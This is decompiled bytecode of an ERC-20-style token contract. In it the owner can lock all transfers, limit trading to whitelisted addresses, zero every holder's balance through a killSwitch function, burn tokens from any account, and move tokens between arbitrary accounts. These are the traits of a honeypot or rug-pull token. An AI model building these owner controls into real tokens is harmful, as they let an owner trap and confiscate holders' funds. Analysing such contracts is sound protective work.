contract main {




// =====================  Runtime code  =====================


uint8 stor0; offset 160
uint8 stor0; offset 168
uint128 stor0; offset 168
uint128 stor0; offset 160
address owner;
array of address stor1;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
array of address stor4;
uint256 totalSupply;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;

function name() payable {
    return name[0 len name.length]
}

function totalSupply() payable {
    return totalSupply
}

function holderCount() payable {
    return stor4.length
}

function decimals() payable {
    return decimals
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function sub_781b09d1(?) payable {
    return bool(uint8(stor0.field_168))
}

function owner() payable {
    return owner
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function locked() payable {
    return bool(uint8(stor0.field_160))
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function isOwner() payable {
    return (msg.sender == owner)
}

function lock() payable {
    require msg.sender == owner
    Mask(96, 0, stor0.field_160) = 1
}

function unlock() payable {
    require msg.sender == owner
    Mask(96, 0, stor0.field_160) = 0
}

function whitelistAll() payable {
    require msg.sender == owner
    Mask(88, 0, stor0.field_168) = 1
}

function sub_92617f36(?) payable {
    require msg.sender == owner
    Mask(88, 0, stor0.field_168) = 0
}

function renounceOwnership() payable {
    require msg.sender == owner
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function transferOwnership(address arg1) payable {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    require arg1
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function isWhite(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 != 0
    idx = 0
    while idx < stor1.length:
        mem[0] = 1
        if stor1[idx] != arg1:
            idx = idx + 1
            continue 
        return 1
    if not uint8(stor0.field_168):
        return 0
    return 1
}

function addWhitelist(address arg1) payable {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    require arg1 != 0
    idx = 0
    while idx < stor1.length:
        mem[0] = 1
        require stor1[idx] != arg1
        idx = idx + 1
        continue 
    stor1.length++
    stor1[stor1.length] = arg1
}

function killSwitch() payable {
    require msg.sender == owner
    totalSupply = 0
    idx = 0
    while idx < stor4.length:
        mem[0] = address(stor4[idx])
        mem[32] = 2
        balanceOf[address(stor4[idx])] = 0
        idx = idx + 1
        continue 
    stor4.length = 0
    idx = 0
    while stor4.length > idx:
        uint256(stor4[idx]) = 0
        idx = idx + 1
        continue 
    emit 0x2dbd7f7d: block.timestamp
}

function mintTokens(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    require arg1
    require totalSupply + arg2 >= totalSupply
    totalSupply += arg2
    require balanceOf[address(arg1)] + arg2 >= balanceOf[address(arg1)]
    balanceOf[address(arg1)] += arg2
    require arg1 != 0
    idx = 0
    while idx < stor4.length:
        mem[0] = 4
        if address(stor4[idx]) != arg1:
            idx = idx + 1
            continue 
        emit Transfer(arg2, 0, arg1);
    stor4.length++
    address(stor4[stor4.length]) = arg1
    emit Transfer(arg2, 0, arg1);
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if uint8(stor0.field_160):
        require msg.sender == owner
    require msg.sender != 0
    idx = 0
    while idx < stor1.length:
        mem[0] = 1
        if stor1[idx] != msg.sender:
            idx = idx + 1
            continue 
        require arg1
        require msg.sender
        allowance[address(msg.sender)][address(arg1)] = arg2
        emit Approval(arg2, msg.sender, arg1);
        return 1
    require uint8(stor0.field_168)
    require arg1
    require msg.sender
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function removeWhitelist(address arg1) payable {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    require arg1 != 0
    idx = 0
    while idx < stor1.length:
        mem[0] = 1
        if stor1[idx] != arg1:
            idx = idx + 1
            continue 
        require stor1.length - 1 < stor1.length
        require idx < stor1.length
        stor1[idx] = stor1[stor1.length]
        require stor1.length - 1 < stor1.length
        stor1[stor1.length] = 0
        stor1.length--
        if stor1.length > stor1.length - 1:
            idx = sha3(1) + stor1.length - 1
            while sha3(1) + stor1.length > idx:
                stor[idx] = 0
                idx = idx + 1
                continue 
}

function decreaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if uint8(stor0.field_160):
        require msg.sender == owner
    require msg.sender != 0
    idx = 0
    while idx < stor1.length:
        mem[0] = 1
        if stor1[idx] != msg.sender:
            idx = idx + 1
            continue 
        require arg2 <= allowance[address(msg.sender)][address(arg1)]
        require arg1
        require msg.sender
        allowance[address(msg.sender)][address(arg1)] -= arg2
        emit Approval((allowance[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
        return 1
    require uint8(stor0.field_168)
    require arg2 <= allowance[address(msg.sender)][address(arg1)]
    require arg1
    require msg.sender
    allowance[address(msg.sender)][address(arg1)] -= arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if uint8(stor0.field_160):
        require msg.sender == owner
    require msg.sender != 0
    idx = 0
    while idx < stor1.length:
        mem[0] = 1
        if stor1[idx] != msg.sender:
            idx = idx + 1
            continue 
        require allowance[address(msg.sender)][address(arg1)] + arg2 >= allowance[address(msg.sender)][address(arg1)]
        require arg1
        require msg.sender
        allowance[address(msg.sender)][address(arg1)] += arg2
        emit Approval((allowance[address(msg.sender)][address(arg1)] + arg2), msg.sender, arg1);
        return 1
    require uint8(stor0.field_168)
    require allowance[address(msg.sender)][address(arg1)] + arg2 >= allowance[address(msg.sender)][address(arg1)]
    require arg1
    require msg.sender
    allowance[address(msg.sender)][address(arg1)] += arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function burnTokens(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    require arg1
    require arg2 <= totalSupply
    totalSupply -= arg2
    require arg2 <= balanceOf[address(arg1)]
    balanceOf[address(arg1)] -= arg2
    if not balanceOf[address(arg1)]:
        require arg1 != 0
        idx = 0
        while idx < stor4.length:
            mem[0] = 4
            if address(stor4[idx]) != arg1:
                idx = idx + 1
                continue 
            require stor4.length - 1 < stor4.length
            require idx < stor4.length
            address(stor4[idx]) = address(stor4[stor4.length])
            require stor4.length - 1 < stor4.length
            address(stor4[stor4.length]) = 0
            stor4.length--
            if stor4.length > stor4.length - 1:
                idx = sha3(4) + stor4.length - 1
                while sha3(4) + stor4.length > idx:
                    stor[idx] = 0
                    idx = idx + 1
                    continue 
            emit Transfer(arg2, arg1, 0);
    emit Transfer(arg2, arg1, 0);
}

function sub_7b58b0e8(?) payable {
    require calldata.size - 4 >= 96
    require msg.sender == owner
    require arg1
    require arg3 <= totalSupply
    totalSupply -= arg3
    require arg3 <= balanceOf[address(arg1)]
    balanceOf[address(arg1)] -= arg3
    if not balanceOf[address(arg1)]:
        require arg1 != 0
        idx = 0
        while idx < stor4.length:
            mem[0] = 4
            if address(stor4[idx]) != arg1:
                idx = idx + 1
                continue 
            require stor4.length - 1 < stor4.length
            require idx < stor4.length
            address(stor4[idx]) = address(stor4[stor4.length])
            require stor4.length - 1 < stor4.length
            address(stor4[stor4.length]) = 0
            stor4.length--
            if stor4.length > stor4.length - 1:
                idx = sha3(4) + stor4.length - 1
                while sha3(4) + stor4.length > idx:
                    stor[idx] = 0
                    idx = idx + 1
                    continue 
            emit Transfer(arg3, arg1, 0);
            require arg2
            require totalSupply + arg3 >= totalSupply
            totalSupply += arg3
            require balanceOf[address(arg2)] + arg3 >= balanceOf[address(arg2)]
            balanceOf[address(arg2)] += arg3
            require arg2 != 0
            idx = 0
            while idx < stor4.length:
                mem[0] = 4
                if address(stor4[idx]) != arg2:
                    idx = idx + 1
                    continue 
                emit Transfer(arg3, 0, arg2);
            stor4.length++
            address(stor4[stor4.length]) = arg2
            emit Transfer(arg3, 0, arg2);
    emit Transfer(arg3, arg1, 0);
    require arg2
    require totalSupply + arg3 >= totalSupply
    totalSupply += arg3
    require balanceOf[address(arg2)] + arg3 >= balanceOf[address(arg2)]
    balanceOf[address(arg2)] += arg3
    require arg2 != 0
    idx = 0
    while idx < stor4.length:
        mem[0] = 4
        if address(stor4[idx]) != arg2:
            idx = idx + 1
            continue 
        emit Transfer(arg3, 0, arg2);
    stor4.length++
    address(stor4[stor4.length]) = arg2
    emit Transfer(arg3, 0, arg2);
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if uint8(stor0.field_160):
        require msg.sender == owner
    require msg.sender != 0
    idx = 0
    while idx < stor1.length:
        mem[0] = 1
        if stor1[idx] != msg.sender:
            idx = idx + 1
            continue 
        require arg1
        require arg2 <= balanceOf[address(msg.sender)]
        balanceOf[address(msg.sender)] -= arg2
        require balanceOf[address(arg1)] + arg2 >= balanceOf[address(arg1)]
        balanceOf[address(arg1)] += arg2
        if msg.sender:
            if not balanceOf[address(msg.sender)]:
                require msg.sender != 0
                idx = 0
                while idx < stor4.length:
                    mem[0] = 4
                    if address(stor4[idx]) != msg.sender:
                        idx = idx + 1
                        continue 
                    require stor4.length - 1 < stor4.length
                    require idx < stor4.length
                    address(stor4[idx]) = address(stor4[stor4.length])
                    require stor4.length - 1 < stor4.length
                    address(stor4[stor4.length]) = 0
                    stor4.length--
                    if stor4.length > stor4.length - 1:
                        idx = sha3(4) + stor4.length - 1
                        while sha3(4) + stor4.length > idx:
                            stor[idx] = 0
                            idx = idx + 1
                            continue 
                    require arg1 != 0
                    idx = 0
                    while idx < stor4.length:
                        mem[0] = 4
                        if address(stor4[idx]) != arg1:
                            idx = idx + 1
                            continue 
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    stor4.length++
                    address(stor4[stor4.length]) = arg1
                    emit Transfer(arg2, msg.sender, arg1);
                    return 1
        require arg1 != 0
        idx = 0
        while idx < stor4.length:
            mem[0] = 4
            if address(stor4[idx]) != arg1:
                idx = idx + 1
                continue 
            emit Transfer(arg2, msg.sender, arg1);
            return 1
        stor4.length++
        address(stor4[stor4.length]) = arg1
        emit Transfer(arg2, msg.sender, arg1);
        return 1
    require uint8(stor0.field_168)
    require arg1
    require arg2 <= balanceOf[address(msg.sender)]
    balanceOf[address(msg.sender)] -= arg2
    require balanceOf[address(arg1)] + arg2 >= balanceOf[address(arg1)]
    balanceOf[address(arg1)] += arg2
    if msg.sender:
        if not balanceOf[address(msg.sender)]:
            require msg.sender != 0
            idx = 0
            while idx < stor4.length:
                mem[0] = 4
                if address(stor4[idx]) != msg.sender:
                    idx = idx + 1
                    continue 
                require stor4.length - 1 < stor4.length
                require idx < stor4.length
                address(stor4[idx]) = address(stor4[stor4.length])
                require stor4.length - 1 < stor4.length
                address(stor4[stor4.length]) = 0
                stor4.length--
                if stor4.length > stor4.length - 1:
                    idx = sha3(4) + stor4.length - 1
                    while sha3(4) + stor4.length > idx:
                        stor[idx] = 0
                        idx = idx + 1
                        continue 
                require arg1 != 0
                idx = 0
                while idx < stor4.length:
                    mem[0] = 4
                    if address(stor4[idx]) != arg1:
                        idx = idx + 1
                        continue 
                    emit Transfer(arg2, msg.sender, arg1);
                    return 1
                stor4.length++
                address(stor4[stor4.length]) = arg1
                emit Transfer(arg2, msg.sender, arg1);
                return 1
    require arg1 != 0
    idx = 0
    while idx < stor4.length:
        mem[0] = 4
        if address(stor4[idx]) != arg1:
            idx = idx + 1
            continue 
        emit Transfer(arg2, msg.sender, arg1);
        return 1
    stor4.length++
    address(stor4[stor4.length]) = arg1
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if uint8(stor0.field_160):
        require msg.sender == owner
    require arg1 != 0
    idx = 0
    while idx < stor1.length:
        mem[0] = 1
        if stor1[idx] != arg1:
            idx = idx + 1
            continue 
        require arg2
        require arg3 <= balanceOf[address(arg1)]
        balanceOf[address(arg1)] -= arg3
        require balanceOf[address(arg2)] + arg3 >= balanceOf[address(arg2)]
        balanceOf[address(arg2)] += arg3
        if arg1:
            if not balanceOf[address(arg1)]:
                require arg1 != 0
                idx = 0
                while idx < stor4.length:
                    mem[0] = 4
                    if address(stor4[idx]) != arg1:
                        idx = idx + 1
                        continue 
                    require stor4.length - 1 < stor4.length
                    require idx < stor4.length
                    address(stor4[idx]) = address(stor4[stor4.length])
                    require stor4.length - 1 < stor4.length
                    address(stor4[stor4.length]) = 0
                    stor4.length--
                    if stor4.length > stor4.length - 1:
                        idx = sha3(4) + stor4.length - 1
                        while sha3(4) + stor4.length > idx:
                            stor[idx] = 0
                            idx = idx + 1
                            continue 
                    require arg2 != 0
                    idx = 0
                    while idx < stor4.length:
                        mem[0] = 4
                        if address(stor4[idx]) != arg2:
                            idx = idx + 1
                            continue 
                        emit Transfer(arg3, arg1, arg2);
                        require arg3 <= allowance[address(arg1)][address(msg.sender)]
                        require msg.sender
                        require arg1
                        allowance[address(arg1)][address(msg.sender)] -= arg3
                        emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
                        return 1
                    stor4.length++
                    address(stor4[stor4.length]) = arg2
                    emit Transfer(arg3, arg1, arg2);
                    require arg3 <= allowance[address(arg1)][address(msg.sender)]
                    require msg.sender
                    require arg1
                    allowance[address(arg1)][address(msg.sender)] -= arg3
                    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
                    return 1
        require arg2 != 0
        idx = 0
        while idx < stor4.length:
            mem[0] = 4
            if address(stor4[idx]) != arg2:
                idx = idx + 1
                continue 
            emit Transfer(arg3, arg1, arg2);
            require arg3 <= allowance[address(arg1)][address(msg.sender)]
            require msg.sender
            require arg1
            allowance[address(arg1)][address(msg.sender)] -= arg3
            emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
            return 1
        stor4.length++
        address(stor4[stor4.length]) = arg2
        emit Transfer(arg3, arg1, arg2);
        require arg3 <= allowance[address(arg1)][address(msg.sender)]
        require msg.sender
        require arg1
        allowance[address(arg1)][address(msg.sender)] -= arg3
        emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
        return 1
    require uint8(stor0.field_168)
    require arg2
    require arg3 <= balanceOf[address(arg1)]
    balanceOf[address(arg1)] -= arg3
    require balanceOf[address(arg2)] + arg3 >= balanceOf[address(arg2)]
    balanceOf[address(arg2)] += arg3
    if arg1:
        if not balanceOf[address(arg1)]:
            require arg1 != 0
            idx = 0
            while idx < stor4.length:
                mem[0] = 4
                if address(stor4[idx]) != arg1:
                    idx = idx + 1
                    continue 
                require stor4.length - 1 < stor4.length
                require idx < stor4.length
                address(stor4[idx]) = address(stor4[stor4.length])
                require stor4.length - 1 < stor4.length
                address(stor4[stor4.length]) = 0
                stor4.length--
                if stor4.length > stor4.length - 1:
                    idx = sha3(4) + stor4.length - 1
                    while sha3(4) + stor4.length > idx:
                        stor[idx] = 0
                        idx = idx + 1
                        continue 
                require arg2 != 0
                idx = 0
                while idx < stor4.length:
                    mem[0] = 4
                    if address(stor4[idx]) != arg2:
                        idx = idx + 1
                        continue 
                    emit Transfer(arg3, arg1, arg2);
                    require arg3 <= allowance[address(arg1)][address(msg.sender)]
                    require msg.sender
                    require arg1
                    allowance[address(arg1)][address(msg.sender)] -= arg3
                    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
                    return 1
                stor4.length++
                address(stor4[stor4.length]) = arg2
                emit Transfer(arg3, arg1, arg2);
                require arg3 <= allowance[address(arg1)][address(msg.sender)]
                require msg.sender
                require arg1
                allowance[address(arg1)][address(msg.sender)] -= arg3
                emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
                return 1
    require arg2 != 0
    idx = 0
    while idx < stor4.length:
        mem[0] = 4
        if address(stor4[idx]) != arg2:
            idx = idx + 1
            continue 
        emit Transfer(arg3, arg1, arg2);
        require arg3 <= allowance[address(arg1)][address(msg.sender)]
        require msg.sender
        require arg1
        allowance[address(arg1)][address(msg.sender)] -= arg3
        emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
        return 1
    stor4.length++
    address(stor4[stor4.length]) = arg2
    emit Transfer(arg3, arg1, arg2);
    require arg3 <= allowance[address(arg1)][address(msg.sender)]
    require msg.sender
    require arg1
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}



}
